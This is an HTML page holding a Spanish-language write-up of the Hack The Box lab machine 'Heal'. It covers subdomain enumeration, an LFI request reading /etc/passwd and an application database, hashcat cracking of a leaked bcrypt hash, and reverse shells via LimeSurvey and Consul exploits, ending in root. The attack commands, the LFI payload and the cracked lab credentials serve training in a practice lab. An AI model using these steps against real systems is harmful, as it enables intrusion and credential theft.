@@ -1,0 +1,279 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Heal - HackTheBox | Jorge Bravo Blog</title>
+  <meta name="description" content="Heal es una máquina enfocada en la explotación de vulnerabilidades en aplicaciones web Ruby on Rails, combinando técnicas de enumeración, explotación de LFI y escalada de privilegios para obtener acceso root. Ofrece un buen reto para practicar análisis de aplicaciones y explotación remota.">
+  
+  <!-- Favicon -->
+  <link rel="icon" href="../../favicon.ico" type="image/x-icon">
+  
+  <!-- CSS -->
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/normalize/8.0.1/normalize.min.css">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.7.0/styles/atom-one-dark.min.css">
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;600&family=Inter:wght@400;500;600;700&display=swap">
+  <link rel="stylesheet" href="../../css/style.css">
+  
+  <!-- Open Graph / Social Media -->
+  <meta property="og:title" content="Dog - HackTheBox | Jorge Bravo Blog">
+  <meta property="og:description" content="Heal es una máquina enfocada en la explotación de vulnerabilidades en aplicaciones web Ruby on Rails, combinando técnicas de enumeración, explotación de LFI y escalada de privilegios para obtener acceso root. Ofrece un buen reto para practicar análisis de aplicaciones y explotación remota.">
+  <meta property="og:type" content="article">
+  <meta property="og:url" content="https://jorgeb02.github.io/porfolio-para-github/blog/writeups/heal.html">
+  <meta property="og:image" content="../../img/writeups/heal/heal.png">
+  
+  <!-- Scripts -->
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.7.0/highlight.min.js" defer></script>
+</head>
+<body>
+  <!-- Header -->
+  <header class="site-header">
+    <div class="container">
+      <div class="header-inner">
+        <div class="logo">
+          <a href="../../index.html" class="logo-link">
+            <h1 class="site-title">Jorge Bravo</h1>
+            <span class="site-description">Ciberseguridad y más</span>
+          </a>
+        </div>
+        
+        <nav class="main-nav">
+          <button class="menu-toggle" aria-expanded="false" aria-controls="navigation">
+            <span class="sr-only">Menú</span>
+            <span class="icon-bar"></span>
+            <span class="icon-bar"></span>
+            <span class="icon-bar"></span>
+          </button>
+          
+          <ul id="navigation" class="nav-menu">
+            <li class="nav-item"><a href="../../index.html" class="nav-link">Inicio</a></li>
+            <li class="nav-item"><a href="../../writeups.html" class="nav-link active">Write-ups</a></li>
+            <li class="nav-item"><a href="../../blog.html" class="nav-link">Blog</a></li>
+            <li class="nav-item"><a href="../../about.html" class="nav-link">Sobre mí</a></li>
+          </ul>
+        </nav>
+      </div>
+    </div>
+  </header>
+  
+  <!-- Reading Progress Indicator -->
+  <div class="reading-progress" id="reading-progress"></div>
+  
+  <!-- Main Content -->
+  <main class="container">
+    <article class="writeup-single">
+      <header class="writeup-header">
+        <div class="writeup-meta">
+          <span class="provider-badge provider-hackthebox">HackTheBox</span>
+          <span class="difficulty-badge difficulty-easy">Medium</span>
+          <span class="date-badge">15 Mayo, 2025</span>
+        </div>
+        
+        <h1 class="writeup-title">Heal</h1>
+        
+        <p class="writeup-description">Heal es una máquina enfocada en la explotación de vulnerabilidades en aplicaciones web Ruby on Rails, combinando técnicas de enumeración, explotación de LFI y escalada de privilegios para obtener acceso root. Ofrece un buen reto para practicar análisis de aplicaciones y explotación remota.</p>
+        
+        <div class="writeup-tags">
+          <span class="tag-badge">LFI</span>
+          <span class="tag-badge">Subdomain Enumeration</span>
+          <span class="tag-badge">Exposed Admin Panel</span>
+          <span class="tag-badge">Burp Suite Analysis</span>
+        </div>
+      </header>
+      
+      <div class="writeup-featured-image">
+        <img src="../../img/writeups/heal/heal.png" alt="Dog - HackTheBox" class="featured-image">
+      </div>
+      
+
+<div class="writeup-content">
+    <h1>HTB - Heal</h1>
+    <p><strong>Dificultad:</strong> Media</p>
+    <p><strong>Resumen:</strong> Heal es una máquina de dificultad media de Hack The Box, basada en Linux y enfocada principalmente en la explotación de una aplicación web hecha en Ruby on Rails. La máquina combina técnicas de enumeración, explotación de una vulnerabilidad LFI para extraer una base de datos, obtención de credenciales hasheadas, escalada de privilegios usando servicios internos, y finalmente explotación de Consul. Muy completa y útil para prácticas realistas de pentest.</p>
+
+    <h2>Heal Write-Up HTB</h2>
+    <p>Una vez listos, comenzamos como siempre con un escaneo Nmap:</p>
+
+    <pre><code>nmap -sV -sS -sC -Pn 10.10.11.46</code></pre>
+
+    <pre><code>
+Starting Nmap 7.93 ( https://nmap.org ) at 2025-05-15 18:09 CEST
+Nmap scan report for 10.10.11.46
+Host is up (0.35s latency).
+Not shown: 998 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 68af80866e617ebf0bea1052d77a943d (ECDSA)
+|_  256 52f48df1c785b66fc65fb2dba61768ae (ED25519)
+80/tcp open  http    nginx 1.18.0 (Ubuntu)
+|_http-title: Did not follow redirect to http://heal.htb/
+|_http-server-header: nginx/1.18.0 (Ubuntu)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+    </code></pre>
+
+    <p>Vemos que hay dos puertos abiertos: el 22 (SSH) y el 80 (HTTP), así que comenzamos por el puerto 80.</p>
+    <p>Nos dirigimos al navegador y accedemos a la web. Pero antes, hay que añadir la IP al archivo de hosts: <code>nano /etc/hosts</code>.</p>
+    <p>Una vez hecho eso, accedemos a <code>http://heal.htb</code>.</p>
+    <img src="../../img/writeups/heal/foto1.png">
+
+    <p>Comenzamos la enumeración de subdominios. Primero ejecutamos un <code>dirsearch -u http://heal.htb</code>, pero no obtenemos resultados relevantes, así que utilizamos <code>ffuf</code>:</p>
+    <pre><code>ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-topmillion-20000.txt -u http://heal.htb -H 'Host: FUZZ.heal.htb' -fs 178</code></pre>
+    <img src="../../img/writeups/heal/foto2.png">
+
+    <p>Accediendo a uno de los subdominios encontrados, nos aparece una página que revela que se trata de una aplicación en Ruby.</p>
+    <img src="../../img/writeups/heal/foto3.png">
+
+    <p>Volvemos a <code>heal.htb</code> e intentamos registrarnos para ver qué funciones ofrece la aplicación.</p>
+    <img src="../../img/writeups/heal/foto4.png">
+
+    <p>Una vez dentro, se muestran varias opciones.</p>
+    <img src="../../img/writeups/heal/foto5.png">
+
+    <p>Explorando los botones y enlaces disponibles, encontramos que el botón "Survey" nos redirige a otro subdominio que no había salido durante la enumeración con <code>ffuf</code>.</p>
+    <img src="../../img/writeups/heal/foto6.png">
+
+    <p>Visitamos <code>http://take-survey.heal.htb/</code>, donde aparece una dirección de contacto: <code>ralph@heal.htb</code>.</p>
+    <img src="../../img/writeups/heal/foto7.png">
+
+    <p>Probamos acceder a <code>/admin</code> en ese subdominio, lo que nos muestra un panel de inicio de sesión.</p>
+    <img src="../../img/writeups/heal/foto8.png">
+
+    <p>Como no obtenemos acceso aún, volvemos a <code>heal.htb/resume</code>. Allí, al final de la página, vemos un botón para exportar un PDF. Interceptamos esta petición con Burp Suite.</p>
+    <img src="../../img/writeups/heal/foto9.png">
+
+    <p>Vemos la solicitud de descarga, que incluye el parámetro <code>filename</code>.</p>
+    <img src="../../img/writeups/heal/foto10.png">
+
+    <p>Modificamos el parámetro para intentar una LFI(Local File Inclusion):</p>
+    <pre><code>GET /download?filename=../../../../etc/passwd HTTP/1.1
+Host: api.heal.htb
+Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjo1fQ.7HQbv7vTQa-UIbcu3TPdEgxs3zZG0tYpT-yOC5uxMbM</code></pre>
+    <img src="../../img/writeups/heal/foto11.png" style="width: 50%; height: auto;">
+
+    <p>La LFI funciona. Como la aplicación es Ruby on Rails, buscamos la base de datos <code>development.sqlite3</code> y accedemos a ella.</p>
+    <img src="../../img/writeups/heal/foto12.png">
+
+    <p>En el contenido vemos el usuario <code>ralph</code> junto con una contraseña hasheada. Usamos <code>hashcat</code> para descifrarla:</p>
+    <pre><code>hashcat -m 3200 '$2a$12$dUZ/O7KJT3.zE4TOK8p4RuxH3t.Bz45DSr7A94VLvY9SWx1GCSZnG' /usr/share/wordlists/rockyou.txt</code></pre>
+    <p>Resultado:</p>
+    <pre><code>$2a$12$dUZ/O7KJT3.zE4TOK8p4RuxH3t.Bz45DSr7A94VLvY9SWx1GCSZnG:147258369</code></pre>
+
+    <p>Con el usuario <code>ralph</code> y la contraseña <code>147258369</code>, accedemos al panel de <code>take-survey.heal.htb/admin</code>.</p>
+    <img src="../../img/writeups/heal/foto13.png">
+
+    <p>Una vez dentro, podemos ver la versión de LimeSurvey instalada.</p>
+    <img src="../../img/writeups/heal/foto14.png">
+
+    <p>Buscamos un exploit para esa versión y seguimos las instrucciones del repositorio.</p>
+    <img src="../../img/writeups/heal/foto15.png">
+    <img src="../../img/writeups/heal/foto16.png">
+
+    <p>En la web, vamos a <strong>Configuration &gt; Plugins</strong> y subimos el plugin <code>N4s1rl1.zip</code> generado.</p>
+    <img src="../../img/writeups/heal/foto17.png">
+    <img src="../../img/writeups/heal/foto18.png">
+    <img src="../../img/writeups/heal/foto19.png">
+
+    <p>Activamos el plugin y tomamos nota del ID, necesario para el exploit.</p>
+    <img src="../../img/writeups/heal/foto20.png" style="width: 50%; height: auto;">
+    <p>Editamos el <code>exploit.py</code> con ese ID:</p>
+    <img src="../../img/writeups/heal/foto21.png">
+
+    <p>Escuchamos con Netcat:</p>
+    <pre><code>nc -nvlp 1234</code></pre>
+    <p>Y luego ejecutamos:</p>
+    <pre><code>python3 exploit.py http://take-survey.heal.htb ralph 147258369 80</code></pre>
+    <img src="../../img/writeups/heal/foto22.png">
+
+    <p>Obtenemos una reverse shell como <code>www-data</code>. Exploramos el sistema y encontramos los usuarios <code>ralph</code> y <code>ron</code>.</p>
+    <img src="../../img/writeups/heal/foto23.png">
+    <img src="../../img/writeups/heal/foto24.png" style="width: 30%; height: auto;">
+
+    <p>Usamos <code>LinPEAS</code> para automatizar la búsqueda de credenciales.</p>
+    <p>Encuentra una contraseña en <code>/var/www/limesurvey/application/config/config.php</code>.</p>
+    <img src="../../img/writeups/heal/foto25.png">
+
+    <p>Probamos esas credenciales vía SSH con el usuario <code>ron</code> y logramos acceder.</p>
+    <img src="../../img/writeups/heal/foto26.png">
+
+    <p>Ya dentro, conseguimos la primera flag.</p>
+    <img src="../../img/writeups/heal/foto27.png" style="width: 50%; height: auto;">
+
+    <p>LinPEAS también detecta que el puerto 8500 está abierto.</p>
+    <img src="../../img/writeups/heal/foto28.png">
+
+    <p>Hacemos un túnel SSH para acceder a él:</p>
+    <pre><code>ssh -L 8500:127.0.0.1:8500 ron@heal.htb</code></pre>
+
+    <p>Visitamos <code>http://127.0.0.1:8500</code> y confirmamos que es Consul, versión 1.19.2.</p>
+    <img src="../../img/writeups/heal/foto29.png">
+
+    <p>Buscamos una vulnerabilidad conocida en esa versión y encontramos un exploit:</p>
+    <a href="https://www.exploit-db.com/exploits/51117" target="_blank">Exploit Consul 1.9.2 - RCE</a>
+
+    <p>Colocamos a la escucha Netcat y luego ejecutamos el exploit:</p>
+    <pre><code>python exploit.py 127.0.0.1 8500 10.10.14.224 6789 0</code></pre>
+    <img src="../../img/writeups/heal/foto30.png">
+
+    <p>La shell se eleva a <code>root</code> y obtenemos la flag final.</p>
+    <img src="../../img/writeups/heal/foto31.png" style="width: 50%; height: auto;">
+</div>
+
+
+
+      
+      <nav class="post-navigation">
+        <a href="../../writeups.html" class="prev-post">
+          <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <line x1="19" y1="12" x2="5" y2="12"></line>
+            <polyline points="12 19 5 12 12 5"></polyline>
+          </svg>
+          Volver a todos los write-ups
+        </a>
+      </nav>
+    </article>
+  </main>
+  
+  <!-- Footer -->
+  <footer class="site-footer">
+    <div class="container">
+      <div class="footer-inner">
+        <div class="footer-info">
+          <p class="copyright">&copy; <span id="current-year">2025</span> Jorge Bravo González. Todos los derechos reservados.</p>
+        </div>
+        
+        <div class="footer-links">
+          <ul class="social-links">
+            <li><a href="https://www.linkedin.com/in/jorge-bravo-gonz%C3%A1lez/" target="_blank" rel="noopener" class="social-link linkedin">LinkedIn</a></li>
+          </ul>
+        </div>
+      </div>
+    </div>
+  </footer>
+  
+  <!-- Scripts -->
+  <script src="../../js/main.js"></script>
+  <script>
+    // Actualizar año actual en el copyright
+    document.getElementById('current-year').textContent = new Date().getFullYear();
+    
+    // Inicializar resaltado de código si hay bloques de código en la página
+    document.addEventListener('DOMContentLoaded', () => {
+      if (typeof hljs !== 'undefined') {
+        document.querySelectorAll('pre code').forEach((block) => {
+          hljs.highlightElement(block);
+        });
+      }
+      
+      // Barra de progreso de lectura
+      const progressBar = document.getElementById('reading-progress');
+      if (progressBar) {
+        window.addEventListener('scroll', () => {
+          const winScroll = document.body.scrollTop || document.documentElement.scrollTop;
+          const height = document.documentElement.scrollHeight - document.documentElement.clientHeight;
+          const scrolled = (winScroll / height) * 100;
+          progressBar.style.width = scrolled + '%';
+        });
+      }
+    });
+  </script>
